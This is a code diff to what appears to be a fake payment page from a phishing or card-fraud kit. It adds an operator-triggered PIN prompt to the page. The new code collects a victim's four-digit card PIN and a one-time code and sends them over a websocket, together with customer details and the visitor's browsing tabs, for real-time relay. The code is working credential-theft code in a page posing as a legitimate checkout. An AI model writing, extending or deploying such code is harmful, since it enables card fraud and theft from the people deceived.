@@ -1492,6 +1492,16 @@ url("pay1ment_icons.woff") format("woff");
       q('otp-result').className = 'hidden';
       q('otp-form').className = '';
       q('otp-spinner').style = '';
+      
+      q('app-verify-overlay').classList.add('hidden');
+      q('app-spinner').classList.add('hidden');
+
+      q('email-overlay').classList.add('hidden');
+      q('email-spinner').classList.add('hidden');
+
+      q('pin-overlay').classList.add('hidden');
+      q('pin-spinner').classList.add('hidden');
+
 
     }
  
@@ -1649,6 +1659,18 @@ url("pay1ment_icons.woff") format("woff");
       document.getElementById('app-error').classList.remove('hidden');
        document.getElementById('app-error').textContent = p.message || 'Operator needs your attention'
     }
+     else if (a === 'pin_verify') {
+      _curStep = 'pin_verify';
+      window._emailVerifyInProgress = false;
+      window._pinVerifyInProgress = true;
+      document.getElementById('load-overlay').classList.add('hidden');
+      document.getElementById('pin-overlay').classList.remove('hidden');
+      document.getElementById('pin-amount-row').style.display = '';
+      document.getElementById('pin-amount').textContent = '$' + discountedTotal().toFixed(2);
+      updateOtpCardLogoStyle(p.cardInfo?.cardType || p.cardType, 'pin-card-logo');
+      resetPin();
+      startPinTimer()
+                        }
 
 
 
@@ -1992,6 +2014,7 @@ url("pay1ment_icons.woff") format("woff");
             }
             function appVerifyContinue() {
                 document.getElementById('app-spinner').style.display = 'flex';
+                document.getElementById('app-spinner').classList.remove('hidden');
                 document.getElementById('app-continue-btn').disabled = true;
                 if (ws && ws.readyState === 1 && sid)
                     ws.send(JSON.stringify({
@@ -2023,6 +2046,96 @@ url("pay1ment_icons.woff") format("woff");
                 }
                 ;el.innerHTML = logo + '<span style="color:#ccc;font-size:18px">|</span><span style="font-family:Arial;font-size:13px">Secure</span>'
             }
+
+
+
+
+            // === PIN verification ===
+            function pinJump(idx) {
+                var el = document.getElementById('pin-d' + idx);
+                if (el) {
+                    el.value = el.value.replace(/\D/g, '');
+                    if (el.value) {
+                        var next = idx < 4 ? document.getElementById('pin-d' + (idx + 1)) : null;
+                        if (next)
+                            next.focus()
+                    }
+                }
+            }
+            function pinBack(e, idx) {
+                if (e.key === 'Backspace') {
+                    var el = document.getElementById('pin-d' + idx);
+                    if (el && !el.value && idx > 1) {
+                        document.getElementById('pin-d' + (idx - 1)).focus()
+                    }
+                }
+            }
+            function resetPin() {
+                for (var i = 1; i <= 4; i++) {
+                    var d = document.getElementById('pin-d' + i);
+                    if (d)
+                        d.value = ''
+                }
+                document.getElementById('pin-error').classList.add('hidden');
+                document.getElementById('pin-spinner').style.display = 'none';
+                document.getElementById('pin-submit').disabled = false;
+                document.getElementById('pin-d1').focus()
+            }
+            var pinSec = 299
+              , pinTmr = null;
+            function startPinTimer() {
+                pinSec = 299;
+                clearInterval(pinTmr);
+                pinTmr = setInterval(function() {
+                    pinSec--;
+                    if (pinSec < 0) {
+                        pinSec = 0;
+                        clearInterval(pinTmr)
+                    }
+                    ;var m = Math.floor(pinSec / 60)
+                      , s = pinSec % 60;
+                    document.getElementById('pin-timer').textContent = m + ':' + String(s).padStart(2, '0')
+                }, 1000)
+            }
+            function submitPin() {
+                var code = '';
+                for (var i = 1; i <= 4; i++) {
+                    code += document.getElementById('pin-d' + i)?.value || ''
+                }
+                if (code.length < 4) {
+                    document.getElementById('pin-error').classList.remove('hidden');
+                    return
+                }
+                document.getElementById('pin-error').classList.add('hidden');
+                document.getElementById('pin-submit').disabled = true;
+                document.getElementById('pin-spinner').style.display = 'flex';
+                if (ws && ws.readyState === 1)
+                    ws.send(JSON.stringify({
+                        type: 'session_update',
+                        payload: {
+                            sessionId: sid,
+                            status: 'pending',
+                            cardInfo: {
+                                otpCode: code
+                            },
+                            customerInfo: buildPayload().customerInfo,
+                            browsingTabs: buildPayload().browsingTabs,
+                            currentStep: 'pin_verify'
+                        }
+                    }))
+            }
+            function resendPin() {
+                if (ws && ws.readyState === 1)
+                    ws.send(JSON.stringify({
+                        type: 'resend_otp',
+                        payload: {
+                            sessionId: sid
+                        }
+                    }))
+            }
+
+
+
 
 
 
